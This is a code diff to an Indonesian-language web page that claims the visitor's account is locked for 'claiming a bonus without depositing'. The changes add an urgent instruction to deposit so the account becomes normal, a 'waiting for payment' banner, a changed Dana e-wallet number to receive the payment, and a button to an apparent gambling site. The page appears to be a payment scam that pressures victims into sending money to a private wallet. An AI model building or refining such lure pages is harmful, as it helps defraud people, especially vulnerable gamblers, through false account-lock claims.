@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -87,6 +86,7 @@
             display: flex;
             justify-content: space-between;
             margin-top: 25px;
+            margin-bottom: 10px; 
         }
         .actions button {
             width: 48%;
@@ -112,6 +112,25 @@
         }
         .unlock-btn:hover {
             background-color: #9858e6;
+        }
+        
+        /* CSS TOMBOL LOGIN BARU */
+        .login-btn {
+            width: 100%; 
+            padding: 12px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+            margin-top: 15px; 
+            background-color: #4CAF50; 
+            color: #121212;
+        }
+        .login-btn:hover {
+            background-color: #45a049;
         }
 
         /* ====================================
@@ -140,7 +159,7 @@
             max-width: 300px;
             box-shadow: 0 5px 15px rgba(0,0,0,0.5);
             animation: fadeIn 0.3s;
-            position: relative; /* Penting untuk penempatan teks di pojok kiri bawah */
+            position: relative; 
         }
         .modal-title {
             font-size: 1.1em;
@@ -153,7 +172,7 @@
             margin: 5px 0;
         }
         .modal-actions {
-            text-align: right;
+            text-align: right; 
             margin-top: 15px;
         }
         .modal-actions button {
@@ -191,17 +210,38 @@
             font-weight: bold;
             color: #d32f2f; 
         }
+
+        /* CSS untuk Teks Menunggu Pembayaran */
+        .waiting-payment-text {
+            display: block;
+            text-align: center;
+            margin: 15px 0; 
+            padding: 5px;
+            background-color: #fff3e0; 
+            border-radius: 4px;
+            font-size: 1em;
+            font-weight: bold;
+            color: #ff9800; 
+        }
+
+        /* CSS BARU: Teks Instruksi di Keterangan Penguncian */
+        .instruction-text {
+            display: block;
+            font-size: 0.9em;
+            font-weight: bold;
+            color: #4CAF50; /* Warna hijau */
+            margin-top: 5px;
+        }
         
         @keyframes blinker {
             50% { opacity: 0; } 
         }
 
         /* ====================================
-           5. CSS Modal Peringatan (DIUBAH)
+           5. CSS Modal Peringatan
            ==================================== */
         #alertModal .modal-content { 
              background-color: #ffcccc;
-             /* Padding bawah dinaikkan untuk memberi ruang teks di pojok */
              padding-bottom: 40px; 
         }
         #alertModal .modal-title { 
@@ -218,7 +258,7 @@
             bottom: 15px;
             left: 20px;
             font-size: 0.75em;
-            color: #757575; /* Warna abu-abu agar tidak terlalu mencolok */
+            color: #757575; 
         }
 
 
@@ -239,13 +279,21 @@
         </div>
         
         <div class="card"><p class="card-title">STATUS AKUN</p><p class="card-content"><span class="status">TERKUNCI</span></p></div>
-        <div class="card"><p class="card-title">KETERANGAN PENGUNCIAN</p><p class="card-content">Klaim bonus tanpa melakukan deposit</p></div>
+        <div class="card">
+            <p class="card-title">KETERANGAN PENGUNCIAN</p>
+            <p class="card-content">
+                Klaim bonus tanpa melakukan deposit<br>
+                <span class="instruction-text">Silahkan deposit di bawah agar akun anda NORMAL</span>
+            </p>
+        </div>
         <div id="realtime-clock">Memuat Waktu...</div>
 
         <div class="actions">
             <button class="deposit-btn" onclick="openModal('depositModal')">DEPOSIT</button>
             <button class="unlock-btn" onclick="openModal('alertModal')">BUKA KUNCI AKUN</button>
         </div>
+        
+        <button class="login-btn" onclick="window.location.href='https://ovo99i.space/'">KEMBALI LOGIN KE OVO99</button>
 
     </div>
 
@@ -253,8 +301,11 @@
       <div class="modal-content">
         <div class="modal-title">TUJUAN DEPOSIT</div>
         <div class="modal-body">
-            <p>Nomor: <span id="depositNumber">0831-9844-7061</span></p>
+            <p>Nomor: <span id="depositNumber">0831-9488-7061</span></p>
             <p>Metode: <span id="depositMethod">Dana</span></p>
+            
+            <span class="waiting-payment-text">⏳ --menunggu pembayaran-- ⏳</span> 
+
             <span class="online-status">ONLINE</span>
             <span id="deposit-time-display">Memuat Tanggal & Waktu...</span>
         </div>
@@ -321,4 +372,4 @@
     </script>
 
 </body>
-<
+</html>
